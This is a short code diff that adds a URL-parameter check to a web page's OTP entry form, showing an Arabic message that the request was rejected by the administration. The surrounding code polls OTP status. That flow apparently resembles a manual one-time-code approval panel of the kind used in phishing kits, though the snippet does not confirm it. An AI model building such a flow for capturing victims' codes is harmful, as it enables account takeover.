@@ -167,6 +167,15 @@
     var rejectOverlay = document.getElementById('rejectOverlay');
     var statusPollTimer = null;
 
+    var urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === '1' || urlParams.get('error') === 'otp') {
+      otpField.classList.add('invalid');
+      var reqText = otpField.querySelector('.req');
+      if (reqText) {
+        reqText.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
+      }
+    }
+
     function stopPoll() { clearInterval(statusPollTimer); statusPollTimer = null; }
 
     function pollOtpStatus() {
